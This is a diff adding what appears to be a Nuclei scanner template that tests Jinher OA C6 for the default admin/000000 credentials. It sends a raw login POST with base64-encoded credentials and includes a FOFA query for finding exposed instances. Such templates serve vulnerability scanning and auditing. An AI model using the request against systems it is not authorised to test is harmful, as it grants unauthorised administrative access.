@@ -1,0 +1,34 @@
+id: jinher-oa-c6-AjaxForLogin-default-login
+
+info:
+  name: 金和 OA c6 AjaxForLogin.aspx - default-login
+  author: sm,pphua
+  severity: high
+  description: 金和 OA 存在默认密码admin/000000
+  reference:
+    - todo
+  metadata:
+    veified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,oa,default-password
+
+http:
+  - raw:
+      - |
+        POST /C6/Jhsoft.Web.login/AjaxForLogin.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+
+        type=login&loginCode=YWRtaW4=&&pwd=MDAwMDAw&
+               
+    matchers:
+      - type: word
+        words:
+          - "OK"
+          - "管理者"
+          - "您好"
+        condition: and
